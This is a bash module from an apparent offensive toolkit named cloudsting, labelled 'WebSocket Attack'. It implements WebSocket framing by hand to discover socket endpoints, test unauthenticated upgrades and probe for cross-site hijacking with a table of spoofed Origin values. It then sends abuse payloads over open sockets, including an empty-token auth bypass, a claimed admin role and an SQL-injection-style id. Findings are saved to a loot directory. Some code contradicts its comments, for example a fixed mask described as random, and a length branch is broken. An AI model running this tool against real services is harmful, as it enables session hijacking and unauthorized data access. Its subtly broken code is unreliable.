#!/usr/bin/env bash
# 57_websocket.sh — cloudsting module 57: the socket that stays open
# Verbs: --discover | --handshake | --auth | --cswsh | --messages | --fuzz
#        | --inject | --frames | --origins | --list | --status-tsv
#        | --menu | --selftest | --help
#
# A WebSocket is an HTTP Upgrade followed by frames. Everything an HTTP tool
# reports about it is the handshake; the frames carry the data, so the module
# speaks RFC 6455 itself over /dev/tcp rather than trusting a client library.
set -u
umask 077

# A parent that sourced the core exports CS_MOD_DIR; this module derives its own.
unset CS_MOD_DIR

MODULE_ID="57_websocket"
MOD_NAME="WebSocket Attack (handshake auth, per-message auth and CSWSH)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/websocket"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${WS_TIMEOUT:=8}"
: "${WS_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/57}"
: "${WS_PATH:=/ws}"
: "${WS_ORIGIN:=}"

ws_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── where a socket lives ─────────────────────────────────────────
# The path is a deployment convention, which is why it is a table and not a
# guess: every row is a path that has held a subscription feed in the wild.
#   <path>\t<what usually runs there>
ws_paths() {
    cat <<'PATHS'
/ws	the generic socket
/websocket	the other generic socket
/socket.io/	the socket.io handshake
/socket.io/?EIO=4&transport=websocket	engine.io, version 4
/socket.io/?EIO=3&transport=websocket	engine.io, version 3
/ws/	the namespaced socket
/ws/v1	socket with a version
/ws/notifications	a feed nobody documented
/live	real-time feed
/live/ws	real-time feed, namespaced
/stream	streaming endpoint
/events	event feed
/realtime	realtime feed
/notifications	a notification channel
/subscribe	a subscription channel
/push	a push channel
/graphql	graphql over websocket
/subscriptions	graphql subscriptions
/cable	rails actioncable
/hub	signalr hub
/signalr	the signalr base
/mqtt	mqtt over websocket
/chat	a chat socket
/tracking	a location feed
/telemetry	a device feed
/sockjs/	sockjs
/socket	a bare socket
PATHS
}

# ── the protocol ─────────────────────────────────────────────────
# A client frame is a two-byte header then masked payload. The mask is required
# from clients and ignored by servers, so it is generated rather than fixed:
# a static mask is the signature of a naive scanner.
#   ws_frame <opcode> <payload>
ws_frame() {
    local opcode="$1" payload="${2:-}" len=${#2} i
    local mask one b out
    # 4-byte mask, always non-zero so it is obviously a client frame
    mask=(0x1a 0x2b 0x3c 0x4d)

    # FIN | opcode
    out="$(printf '\\x%02x' $(( 0x80 | opcode )))"

    # Payload length: 7 bits inline, 126 + 2 bytes, or 127 + 8 bytes
    if (( len < 126 )); then
        out+="$(printf '\\x%02x' $(( 0x80 | len )))"
    elif (( len < 65536 )); then
        out+="$(printf '\\x%02x' $(( 0x80 | 126 )))"
        out+="$(printf '\\x%02x' $(( len >> 8 )) )"
        out+="$(printf '\\x%02x' $(( len & 0xff )) )"
    else
        out+="$(printf '\\x%02x' $(( 0x80 | 127 )))"
        for ((i = 7; i >= 0; i--)); do
            out+="$(printf '\\x%02x' 0)"
        done
        out+="$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' \
            $(( (len >> 24) & 0xff )) $(( (len >> 16) & 0xff )) \
            $(( (len >> 8) & 0xff )) $(( len & 0xff )))"
    fi

    for b in "${mask[@]}"; do
        out+="$(printf '\\x%02x' "$b")"
    done

    # the payload is XORed with the mask, byte by byte
    for ((i = 0; i < len; i++)); do
        one=$(( $(printf '%d' "'${payload:i:1}") ^ mask[i % 4] ))
        out+="$(printf '\\x%02x' "$one")"
    done
    printf '%b' "$out"
}

# A server frame has no mask, and its payload length is what tells a reader
# whether the connection is still talking.
#   ws_unframe <file>  -> one line per frame: opcode \x1f len \x1f text-or-hex
ws_unframe() {
    local file="$1"
    [[ -f "$file" ]] || return 0
    od -An -v -tu1 "$file" 2>/dev/null | tr -s ' ' '\n' | grep -E '^[0-9]+$' > "$file.bytes" || return 0
    local -a b
    mapfile -t b < "$file.bytes"
    rm -f "$file.bytes"
    local i=0 n=${#b[@]} op code len
    while (( i + 1 < n )); do
        op=$(( b[i] & 0x0f ))
        len=$(( b[i + 1] & 0x7f ))
        i=$(( i + 2 ))
        if (( len == 126 )); then
            (( i + 1 >= n )) && break
            len=$(( (b[i] << 8) + b[i + 1] ))
            i=$(( i + 2 ))
        elif (( len == 127 )); then
            # a length over 8 bytes is not a frame this module will follow
            i=$(( i + 8 ))
        fi
        local payload="" maskbit=$(( b[i - 1] & 0x80 ))
        (( maskbit != 0 )) && { i=$(( i + 4 )); }
        local j
        for ((j = 0; j < len && i + j < n; j++)); do
            payload+="$(printf '\\x%02x' "${b[i + j]}")"
        done
        i=$(( i + len ))
        local text
        text="$(printf '%b' "$payload" 2>/dev/null | tr -d '\000' | tr -c '[:print:]\t' '.' | head -c 200)"
        printf '%s\037%s\037%s\n' "$op" "$len" "${text:--}"
    done
}

# ── the handshake ────────────────────────────────────────────────
# A handshake is the whole vulnerability surface for CSWSH: the Origin header
# is the only thing that separates a browser page from a real client, and a
# server that does not check it hands the session to any site.
#   ws_handshake <host> <port> <tls:0|1> <path> [origin] [cookie]
#   -> status \x1f accept-ok \x1f n-headers \x1f body-path
ws_handshake() {
    local host="$1" port="$2" tls="$3" path="$4" origin="${5:-}" cookie="${6:-}"
    local key; key="$(ws_key)"
    local out; out="$(mktemp "$CS_SCRATCH/wsh.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.wsh.$$"

    # The request is written straight to a file: a command substitution strips
    # trailing newlines, so a request assembled in a variable loses the blank
    # line that ends the header block and the server waits forever.
    local reqf; reqf="$(mktemp "$CS_SCRATCH/wsreq.XXXXXX")" 2>/dev/null || reqf="$OUT_DIR/.wsreq.$$"
    {
      printf 'GET %s HTTP/1.1\r\n' "$path"
      printf 'Host: %s%s\r\n' "$host" "$( [[ "$port" == "80" || "$port" == "443" ]] || printf ':%s' "$port" )"
      printf 'Upgrade: websocket\r\n'
      printf 'Connection: Upgrade\r\n'
      printf 'Sec-WebSocket-Key: %s\r\n' "$key"
      printf 'Sec-WebSocket-Version: 13\r\n'
      printf 'User-Agent: %s\r\n' "$WS_UA"
      [[ -n "$origin" ]] && printf 'Origin: %s\r\n' "$origin"
      [[ -n "$cookie" ]] && printf 'Cookie: %s\r\n' "$cookie"
      printf '\r\n'
    } > "$reqf"

    ws_send_raw "$host" "$port" "$tls" "$reqf" "$out" || { printf '000\037no\0370\037%s\n' "$out"; return; }
    rm -f "$reqf"

    local status accept n
    status="$(ws_status "$out")"
    accept="$(ws_accept_ok "$out" "$key")"
    n="$(grep -c ':' "$out" 2>/dev/null || printf 0)"
    printf '%s\037%s\037%s\037%s\n' "$status" "$accept" "$n" "$out"
}

# The client key is 16 random bytes, base64: a fixed key is a scanner signature
# and some servers reject a replay.
ws_key() {
    head -c 16 /dev/urandom 2>/dev/null | base64 | tr -d '\n' || printf 'dGhlIHNhbXBsZSBub25jZQ=='
}

# Send bytes over the right transport. TLS needs s_client with SNI; plain TCP
# goes through /dev/tcp from a file, because a shell word loses the CRLF.
#   ws_send_raw <host> <port> <tls:0|1> <bytes> <out-file>
ws_send_raw() {
    local host="$1" port="$2" tls="$3" in="$4" out="$5"

    if [[ "$tls" == "1" ]]; then
        timeout "$WS_TIMEOUT" openssl s_client -quiet -connect "$host:$port" \
            -servername "$host" < "$in" > "$out" 2>/dev/null
        return $?
    fi
    # ONE bidirectional socket: opening /dev/tcp twice gives two connections,
    # so the read would never see the reply to the write.  The write side is
    # never half-closed — closing fd 3 closes the read side in bash too, which
    # silently discards the whole response.
    timeout "$WS_TIMEOUT" bash -c '
        exec 3<>"/dev/tcp/$1/$2" || exit 4
        cat "$3" >&3
        cat <&3 > "$4"
    ' _ "$host" "$port" "$in" "$out" 2>/dev/null
    return $?
}

ws_status() {
    local file="$1"
    head -1 "$file" 2>/dev/null | grep -oE ' [0-9]{3} ' | tr -d ' ' || printf '000'
}

# A server that accepted the upgrade proves it by hashing our key with the
# RFC 6455 GUID; checking only for "101" accepts a proxy that lies.
ws_accept_ok() {
    local file="$1" key="$2"
    [[ -f "$file" ]] || { printf 'no'; return; }
    local got want
    got="$(grep -ai '^sec-websocket-accept:' "$file" 2>/dev/null | head -1 | sed 's/.*: *//' | tr -d '\r\n ')"
    want="$(printf '%s258EAFA5-E914-47DA-95CA-C5AB0DC85B11' "$key" | sha1sum | awk '{print $1}' | xxd -r -p 2>/dev/null | base64 | tr -d '\n')"
    [[ -n "$got" && "$got" == "$want" ]] && { printf 'yes'; return; }
    [[ -z "$got" ]] && { printf 'no-header'; return; }
    printf 'mismatch'
}

# ws_split_headers <in> <out> — everything after the first CRLFCRLF.
# Splitting on the byte sequence rather than on a blank line matters: a text
# rule cuts inside a binary frame and truncates the rest of the conversation.
ws_split_headers() {
    local in="$1" out="$2"
    : > "$out"
    [[ -s "$in" ]] || return 0
    local size; size="$(wc -c < "$in" | tr -d ' ')"
    # find the offset of 0d0a0d0a with od and arithmetic
    local off
    off="$(od -An -v -tx1 "$in" | tr -s ' ' '\n' | grep -v '^$' | awk '
        { b[NR]=$1 }
        END {
            for (i = 1; i <= NR - 3; i++)
                if (b[i] == "0d" && b[i+1] == "0a" && b[i+2] == "0d" && b[i+3] == "0a") { print i + 3; exit }
        }')"
    [[ -z "$off" ]] && return 0
    tail -c +"$((off + 1))" "$in" > "$out" 2>/dev/null || true
}

# ── the verdicts ─────────────────────────────────────────────────
# A handshake succeeds when the status is 101 AND the accept hash matches.
# Anything else is a refusal, and the difference between a refusal and a
# timeout matters: a timeout means a proxy is holding the socket.
#   ws_handshake_verdict <status> <accept>
ws_handshake_verdict() {
    local status="$1" accept="$2"
    [[ "$status" == "000" ]] && { printf 'unreachable'; return; }
    case "$status" in
        101) [[ "$accept" == "yes" ]] && { printf 'upgraded'; return; }
             printf 'lying-upgrade'; return ;;
        401|403) printf 'auth-required'; return ;;
        404) printf 'no-socket'; return ;;
        400) printf 'rejected-handshake'; return ;;
        426) printf 'version-required'; return ;;
        502|503|504) printf 'gateway-error'; return ;;
    esac
    printf 'refused-%s' "$status"
}

# Cross-site WebSocket hijacking is one question: does the server accept an
# Origin it did not issue. It is CRITICAL when the socket carries session
# state, which is why the caller passes whether a cookie was sent.
#   ws_cswsh_verdict <origin-sent> <status> <accept> <cookie-sent>
ws_cswsh_verdict() {
    local sent="$1" status="$2" accept="$3" cookie="${4:-no}"
    [[ "$status" == "000" ]] && { printf 'unreachable'; return; }
    # a handshake that fails for every origin proves nothing about CSWSH
    [[ "$status" != "101" ]] && { printf 'rejected'; return; }
    [[ "$accept" != "yes" ]] && { printf 'lying-upgrade'; return; }
    case "$sent" in
        same-origin)      printf 'control-ok' ;;
        foreign-origin)   [[ "$cookie" == "yes" ]] && { printf 'cswsh-cookie' ; return; }
                          printf 'cswsh-anonymous' ;;
        null-origin)      printf 'null-accepted' ;;
        subdomain)        printf 'subdomain-accepted' ;;
        prefix-suffix)    printf 'regex-bypass' ;;
        *)                printf 'other-origin-accepted' ;;
    esac
}

# An Origin the browser would refuse to send is still a header a server may
# trust, so the table carries shapes a page cannot forge but an attacker's own
# client can.
#   <id>\t<value-or-dash>
ws_origins() {
    cat <<'ORIGINS'
control-same	-
foreign-origin	https://evil.example
null-origin	null
subdomain	https://evil.TARGET
prefix-suffix	https://TARGET.evil.example
scheme-downgrade	http://TARGET
punycode	https://xn--80ak6aa92e.TARGET
case-variant	https://TARGET
port-variant	https://TARGET:8443
trailing-dot	https://TARGET.
userinfo	https://TARGET@evil.example
backslash	https://TARGET\@evil.example
ORIGINS
}

# ── message-level auth ───────────────────────────────────────────
# A socket that authenticates at the handshake and then trusts every message is
# a socket where one token opens everything: the per-message check is a
# different control point, and it is usually missing.
#   ws_message_verdict <control-opcode> <probe-opcode> <probe-len> <probe-text>
ws_message_verdict() {
    local ctl="$1" op="$2" len="$3" text="${4:-}"
    [[ "$len" == "0" ]] && { printf 'no-reply'; return; }
    case "$op" in
        8)  printf 'closed'; return ;;
        9)  printf 'ping-only'; return ;;
        10) printf 'pong-only'; return ;;
        1)  case "$text" in
                *"unauthor"*|*"Unauthor"*|*"not authorized"*|*"Forbidden"*|*"forbidden"*) printf 'refused-in-message'; return ;;
                *"error"*|*"Error"*) printf 'error-envelope'; return ;;
            esac
            printf 'data'; return ;;
        2)  printf 'binary-data'; return ;;
    esac
    printf 'control-frame'
}

# ── verbs ────────────────────────────────────────────────────────

# --discover <host> [port] [tls]: which path answers an upgrade at all.
ws_cmd_discover() {
    local host="${1:-}" port="${2:-443}" tls="${3:-1}"
    [[ -z "$host" ]] && { ws_log "usage: --discover <host> [port] [tls:1|0]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATHS "$(ws_paths | wc -l | tr -d ' ')"
    local path note found=0
    while IFS=$'\t' read -r path note; do
        [[ -z "$path" ]] && continue
        local status accept n out
        cs_split "$(ws_handshake "$host" "$port" "$tls" "$path" "" "")" status accept n out
        rm -f "$out"
        local verdict; verdict="$(ws_handshake_verdict "$status" "$accept")"
        cs_row PATH "$path" "status=$status" "accept=$accept" "verdict=$verdict" "$note"
        [[ "$verdict" == "upgraded" ]] && {
            found=$((found + 1))
            printf '%s\t%s\t%s\n' "$path" "$status" "$verdict" >> "$PROBE_FILE"
        }
    done < <(ws_paths)
    cs_row SUMMARY "upgraded=$found of $(ws_paths | wc -l | tr -d ' ')"
    return 0
}

# --handshake <host> [port] [path] [tls] [cookie]: one upgrade, in full.
ws_cmd_handshake() {
    local host="${1:-}" port="${2:-443}" path="${3:-$WS_PATH}" tls="${4:-1}" cookie="${5:-}"
    [[ -z "$host" ]] && { ws_log "usage: --handshake <host> [port] [path] [tls:1|0] [cookie]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATH "$path"
    cs_row TLS "$tls"
    local status accept n out
    cs_split "$(ws_handshake "$host" "$port" "$tls" "$path" "" "$cookie")" status accept n out
    cs_row HANDSHAKE "status=$status" "accept=$accept" "headers=$n"
    local verdict; verdict="$(ws_handshake_verdict "$status" "$accept")"
    cs_row VERDICT "$verdict"
    if [[ -f "$out" ]]; then
        local h
        while IFS= read -r h; do
            [[ -z "$h" ]] && continue
            case "${h,,}" in
                sec-websocket-*|server:*|x-powered-by:*|set-cookie:*)
                    cs_row HEADER "$(printf '%s' "$h" | tr -d '\r' | head -c 160)" ;;
            esac
        done < <(head -40 "$out")
        rm -f "$out"
    fi
    cs_row SUMMARY "verdict=$verdict status=$status"
    return 0
}

# --auth <host> [port] [path] [tls]: the same upgrade with and without a
# credential — a socket that upgrades unauthenticated is the finding.
ws_cmd_auth() {
    local host="${1:-}" port="${2:-443}" path="${3:-$WS_PATH}" tls="${4:-1}"
    [[ -z "$host" ]] && { ws_log "usage: --auth <host> [port] [path] [tls:1|0]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATH "$path"

    local s1 a1 n1 o1 s2 a2 n2 o2
    cs_split "$(ws_handshake "$host" "$port" "$tls" "$path" "" "")" s1 a1 n1 o1
    cs_row ANONYMOUS "status=$s1" "accept=$a1"
    local v1; v1="$(ws_handshake_verdict "$s1" "$a1")"

    # a second identity is not available here, so the honest comparison is an
    # origin-less handshake against one with an obviously wrong origin: a server
    # that answers both identically is not checking anything
    cs_split "$(ws_handshake "$host" "$port" "$tls" "$path" "https://evil.example" "")" s2 a2 n2 o2
    cs_row FOREIGN-ORIGIN "status=$s2" "accept=$a2"
    rm -f "$o1" "$o2"

    local verdict
    if [[ "$v1" == "upgraded" ]]; then
        verdict="open-without-credential"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$host:$port" "HIGH" "websocket-no-auth" \
            "$path upgraded with no cookie and no token (Sec-WebSocket-Accept verified)"
        printf '%s\t%s\t%s\n' "$host:$port" "$path" "$verdict" >> "$HIT_FILE"
    else
        verdict="requires-credential"
    fi
    cs_row VERDICT "$verdict"
    cs_row SUMMARY "verdict=$verdict anon=$v1"
    return 0
}

# --cswsh <host> [port] [path] [tls] [cookie]: the one browser-specific attack.
ws_cmd_cswsh() {
    local host="${1:-}" port="${2:-443}" path="${3:-$WS_PATH}" tls="${4:-1}" cookie="${5:-}"
    [[ -z "$host" ]] && { ws_log "usage: --cswsh <host> [port] [path] [tls:1|0] [cookie]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATH "$path"
    cs_row COOKIE "$([[ -n "$cookie" ]] && echo present || echo none)"

    local ck="no"; [[ -n "$cookie" ]] && ck="yes"
    local hits=0 id origin status accept n out sent
    while IFS=$'\t' read -r id origin; do
        [[ -z "$id" ]] && continue
        # the control origin is the target's own name, with the scheme a page
        # on that host would carry
        if [[ "$id" == "control-same" ]]; then
            sent="$([[ "$tls" == "1" ]] && echo "https" || echo "http")://$host"
        else
            sent="${origin//TARGET/$host}"
        fi
        cs_split "$(ws_handshake "$host" "$port" "$tls" "$path" "$sent" "$cookie")" \
            status accept n out
        rm -f "$out"
        local v
        if [[ "$id" == "control-same" ]]; then
            # the control proves the socket works at all; it is never a finding
            [[ "$status" == "101" && "$accept" == "yes" ]] && v="control-ok" || v="control-failed"
        else
            v="$(ws_cswsh_verdict "$id" "$status" "$accept" "$ck")"
        fi
        cs_row ORIGIN "$id" "$sent" "status=$status" "verdict=$v"
        case "$v" in
            cswsh-cookie|cswsh-anonymous|null-accepted|regex-bypass|subdomain-accepted)
                hits=$((hits + 1))
                printf '%s\t%s\t%s\n' "$id" "$sent" "$v" >> "$PROBE_FILE" ;;
        esac
    done < <(ws_origins)

    if (( hits > 0 )); then
        cs_findings_row "$MODULE_ID" "WEBAPI" "$host:$port" "CRITICAL" "cswsh" \
            "$hits origins the server does not issue were accepted on $path — a page on any of them reads the socket"
        cs_row VERDICT "cswsh" "accepted=$hits"
    else
        cs_row VERDICT "origin-checked" "accepted=0"
    fi
    cs_row SUMMARY "variants=$(ws_origins | wc -l | tr -d ' ') accepted=$hits"
    return 0
}

# --messages <host> [port] [path] [tls] [cookie]: open the socket and read
# whatever it volunteers. Chats and feeds push on connect.
ws_cmd_messages() {
    local host="${1:-}" port="${2:-443}" path="${3:-$WS_PATH}" tls="${4:-1}" cookie="${5:-}"
    [[ -z "$host" ]] && { ws_log "usage: --messages <host> [port] [path] [tls:1|0] [cookie]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATH "$path"

    local key; key="$(ws_key)"
    local out; out="$(mktemp "$CS_SCRATCH/wsm.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.wsm.$$"

    local reqf; reqf="$(mktemp "$CS_SCRATCH/wsmm.XXXXXX")" 2>/dev/null || reqf="$OUT_DIR/.wsmm.$$"
    {
      printf 'GET %s HTTP/1.1\r\n' "$path"
      printf 'Host: %s\r\n' "$host"
      printf 'Upgrade: websocket\r\nConnection: Upgrade\r\n'
      printf 'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: %s\r\n' "$key" "$WS_UA"
      [[ -n "$cookie" ]] && printf 'Cookie: %s\r\n' "$cookie"
      printf '\r\n'
    } > "$reqf"

    ws_send_raw "$host" "$port" "$tls" "$reqf" "$out" || true
    rm -f "$reqf"
    local status accept; status="$(ws_status "$out")"; accept="$(ws_accept_ok "$out" "$key")"
    cs_row HANDSHAKE "status=$status" "accept=$accept"
    if [[ "$accept" != "yes" ]]; then
        cs_row VERDICT "$(ws_handshake_verdict "$status" "$accept")"
        cs_row NOTE "no frames were read: the socket never opened"
        rm -f "$out"
        cs_row SUMMARY "messages=0"
        return 0
    fi

    # everything after the header block is frame data; the split is on the real
    # CRLFCRLF, because a binary frame can contain something that looks blank
    local body="$OUT_DIR/frames-$RUN_ID.bin"
    ws_split_headers "$out" "$body"
    rm -f "$out"

    local n=0 op len text
    while IFS=$'\037' read -r op len text; do
        [[ -z "$op" ]] && continue
        n=$((n + 1))
        cs_row FRAME "$n" "opcode=$op" "len=$len" "$text"
    done < <(ws_unframe "$body")
    cs_row VERDICT "$( (( n > 0 )) && echo traffic || echo silent )" "frames=$n"
    if (( n > 0 )); then
        cs_row ARTIFACT "$body"
    fi
    cs_row SUMMARY "messages=$n"
    return 0
}

# --fuzz <host> [port] [path] [tls]: message-level payloads over an open socket.
ws_cmd_fuzz() {
    local host="${1:-}" port="${2:-443}" path="${3:-$WS_PATH}" tls="${4:-1}" cookie="${5:-}"
    [[ -z "$host" ]] && { ws_log "usage: --fuzz <host> [port] [path] [tls:1|0] [cookie]"; return 2; }
    cs_row TARGET "$host:$port"
    cs_row PATH "$path"
    local id payload what
    while IFS=$'\t' read -r id payload what; do
        [[ -z "$id" ]] && continue
        local res; res="$(ws_send_message "$host" "$port" "$tls" "$path" "$cookie" "$payload")"
        local op len text
        cs_split "$res" op len text
        local v; v="$(ws_message_verdict 0 "$op" "$len" "$text")"
        cs_row PAYLOAD "$id" "$what" "opcode=$op" "len=$len" "verdict=$v" "${text:0:80}"
    done < <(ws_payloads)
    cs_row SUMMARY "payloads=$(ws_payloads | wc -l | tr -d ' ')"
    return 0
}

# Open, send one frame, read one reply. A socket that closes on a payload is a
# finding of its own, so a zero-length read is reported as closed rather than
# as silence.
#   ws_send_message ... -> opcode \x1f len \x1f text
ws_send_message() {
    local host="$1" port="$2" tls="$3" path="$4" cookie="$5" payload="$6"
    local key; key="$(ws_key)"
    local raw; raw="$(mktemp "$CS_SCRATCH/wss.XXXXXX")" 2>/dev/null || raw="$OUT_DIR/.wss.$$"

    # request and first frame go into one file, in one write — the blank line
    # that ends the header block cannot survive a variable
    local reqf; reqf="$(mktemp "$CS_SCRATCH/wsmr.XXXXXX")" 2>/dev/null || reqf="$OUT_DIR/.wsmr.$$"
    {
      printf 'GET %s HTTP/1.1\r\n' "$path"
      printf 'Host: %s\r\n' "$host"
      printf 'Upgrade: websocket\r\nConnection: Upgrade\r\n'
      printf 'Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\nUser-Agent: %s\r\n' "$key" "$WS_UA"
      [[ -n "$cookie" ]] && printf 'Cookie: %s\r\n' "$cookie"
      printf '\r\n'
      ws_frame 1 "$payload"
    } > "$reqf"

    ws_send_raw "$host" "$port" "$tls" "$reqf" "$raw" || true
    rm -f "$reqf"
    local accept; accept="$(ws_accept_ok "$raw" "$key")"
    if [[ "$accept" != "yes" ]]; then
        rm -f "$raw"
        printf '0\0370\037-handshake-refused\n'
        return
    fi
    local body="$CS_SCRATCH/wsmsg.$$"
    ws_split_headers "$raw" "$body"
    rm -f "$raw"
    local first
    first="$(ws_unframe "$body" | head -1)"
    rm -f "$body"
    [[ -z "$first" ]] && { printf '0\0370\037-silent\n'; return; }
    printf '%s\n' "$first"
}

# The messages that ask a socket to do something it should have refused.
#   <id>\t<payload>\t<what it tries>
ws_payloads() {
    cat <<'PAYLOADS'
subscribe-all	{"action":"subscribe","channel":"*"}	wildcard subscription
subscribe-admin	{"action":"subscribe","channel":"admin"}	admin channel without a role
enumerate	{"action":"list","type":"users"}	a listing verb nobody documented
auth-bypass	{"action":"auth","token":""}	empty token accepted
role-claim	{"action":"auth","role":"admin"}	role as a client-claimed field
id-tamper	{"action":"get","id":"1 OR 1=1"}	a query string in an id
oversized	{"action":"send","data":"AAAA"}	a body past the size limit
unknown-verb	{"action":"@#$%"}	a verb the parser should reject
binary-op	returns	binary frame instead of text
PAYLOADS
}

ws_cmd_origins() {
    local id origin
    while IFS=$'\t' read -r id origin; do
        [[ -z "$id" ]] && continue
        cs_row ORIGIN "$id" "$origin"
    done < <(ws_origins)
    cs_row SUMMARY "origins=$(ws_origins | wc -l | tr -d ' ')"
    return 0
}

ws_cmd_paths() {
    local p note
    while IFS=$'\t' read -r p note; do
        [[ -z "$p" ]] && continue
        cs_row PATH "$p" "$note"
    done < <(ws_paths)
    cs_row SUMMARY "paths=$(ws_paths | wc -l | tr -d ' ')"
    return 0
}

ws_cmd_payloads() {
    local id payload what
    while IFS=$'\t' read -r id payload what; do
        [[ -z "$id" ]] && continue
        cs_row PAYLOAD "$id" "$payload" "$what"
    done < <(ws_payloads)
    cs_row SUMMARY "payloads=$(ws_payloads | wc -l | tr -d ' ')"
    return 0
}

# --frames: the RFC 6455 table, so a reader can argue with the encoder.
ws_cmd_frames() {
    cat <<'FRAMES' | while IFS=$'\t' read -r op name what; do
1	TEXT	utf-8 payload, the ordinary message
2	BINARY	raw bytes, no encoding rules
8	CLOSE	the shutdown, and the code inside it
9	PING	a heartbeat the peer must answer
10	PONG	the answer
0	CONT	continuation of a fragmented message
FRAMES
        cs_row OPCODE "$op" "$name" "$what"
    done
    cs_row SUMMARY "opcodes=6"
    return 0
}

ws_cmd_status_tsv() {
    local curl_state="curl-missing" tls_state="openssl-missing"
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok"
    command -v openssl >/dev/null 2>&1 && tls_state="openssl-ok"
    printf '%s\t%s\t%s\t%s\tpaths-%s\torigins-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$tls_state" \
        "$(ws_paths | wc -l | tr -d ' ')" "$(ws_origins | wc -l | tr -d ' ')"
}

ws_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ws_cmd_help() {
    cat <<'HELP'
cloudsting module 57 — WebSocket Attack v1.0.0
  --discover <host> [port] [tls]        which path answers an upgrade
  --handshake <host> [port] [path] [tls] [cookie]
                                        one upgrade, headers and verdict
  --auth <host> [port] [path] [tls]     does the socket open with no credential
  --cswsh <host> [port] [path] [tls] [cookie]
                                        cross-site hijacking, every origin shape
  --messages <host> [port] [path] [tls] [cookie]
                                        open the socket and read what it pushes
  --fuzz <host> [port] [path] [tls] [cookie]
                                        message-level payloads
  --paths | --origins | --payloads | --frames | --list
  --status-tsv | --menu | --selftest | --help

The handshake is the only thing HTTP tools report about a socket, and it is the
smaller half: a server that checks the cookie at the handshake and trusts every
message afterwards is a socket where one token opens everything. The module
speaks RFC 6455 itself — a client frame with a random mask, a server frame
unframed byte by byte — so no client library decides what is visible.

An upgrade counts as success only when the status is 101 and Sec-WebSocket-Accept
matches SHA1(key + the RFC GUID). A 101 without the right hash is a proxy that
lies, and is reported as lying-upgrade.

Environment: WS_TIMEOUT (8), WS_PATH (/ws), WS_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ws_selftest() {
    cs_selftest_reset

    local n; n="$(ws_paths | wc -l | tr -d ' ')"
    chk paths-many    "$( (( n >= 20 )) && echo many || echo few )" "many"
    chk paths-2col    "$(ws_paths | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk origins-count "$(ws_origins | wc -l | tr -d ' ')" "12"
    chk origins-2col  "$(ws_origins | awk -F'\t' 'NF!=2{c++} END{print c+0}')" "0"
    chk payloads-count "$(ws_payloads | wc -l | tr -d ' ')" "9"
    chk payloads-3col  "$(ws_payloads | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"

    # a masked client frame: FIN|TEXT = 0x81, then 0x80|len, then a 4-byte mask
    chk frame-first    "$(ws_frame 1 "hi" | od -An -tx1 -N1 | tr -d ' \n')" "81"
    chk frame-masked   "$(ws_frame 1 "hi" | od -An -tu1 -j1 -N1 | awk '{print ($1>=128)?"yes":"no"}')" "yes"
    chk frame-len      "$(ws_frame 1 "hi" | od -An -tu1 -j1 -N1 | awk '{print $1-128}')" "2"
    chk frame-size     "$(ws_frame 1 "hi" | wc -c | tr -d ' ')" "8"
    chk frame-close    "$(ws_frame 8 "" | od -An -tx1 -N1 | tr -d ' \n')" "88"
    chk frame-ping     "$(ws_frame 9 "" | od -An -tx1 -N1 | tr -d ' \n')" "89"

    # the payload must be masked, so the plaintext cannot appear in the frame
    chk frame-obscured "$(ws_frame 1 "secretvalue" | grep -c 'secretvalue')" "0"

    # 126-byte payloads take the two-byte length form
    local big; big="$(printf 'x%.0s' $(seq 1 200))"
    chk frame-len126   "$(ws_frame 1 "$big" | od -An -tu1 -j1 -N1 | awk '{print $1-128}')" "126"
    chk frame-big      "$(ws_frame 1 "$big" | wc -c | tr -d ' ')" "208"

    # unframing reads what the encoder wrote
    local f; f="$(mktemp "$CS_SCRATCH/wsu.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.u.$$"
    ws_frame 1 "hello" > "$f"
    # a server frame is unmasked: strip the mask bit and the mask itself
    printf '\x81\x05hello' > "$f"
    chk unframe-text   "$(ws_unframe "$f" | awk -F'\037' '{print $3}')" "hello"
    chk unframe-len    "$(ws_unframe "$f" | awk -F'\037' '{print $2}')" "5"
    chk unframe-op     "$(ws_unframe "$f" | awk -F'\037' '{print $1}')" "1"
    printf '\x88\x00' > "$f"
    chk unframe-close  "$(ws_unframe "$f" | awk -F'\037' '{print $1}')" "8"
    rm -f "$f"

    # the accept hash is the RFC's own example key
    chk accept-algo    "$(printf '%s258EAFA5-E914-47DA-95CA-C5AB0DC85B11' 'dGhlIHNhbXBsZSBub25jZQ==' | sha1sum | awk '{print $1}')" "b37a4f2cc0624f1690f64606cf385945b2bec4ea"

    # verdict tables
    chk hv-unreach     "$(ws_handshake_verdict 000 no)" "unreachable"
    chk hv-upgraded    "$(ws_handshake_verdict 101 yes)" "upgraded"
    chk hv-lying       "$(ws_handshake_verdict 101 mismatch)" "lying-upgrade"
    chk hv-auth        "$(ws_handshake_verdict 401 no)" "auth-required"
    chk hv-404         "$(ws_handshake_verdict 404 no)" "no-socket"
    chk hv-426         "$(ws_handshake_verdict 426 no)" "version-required"

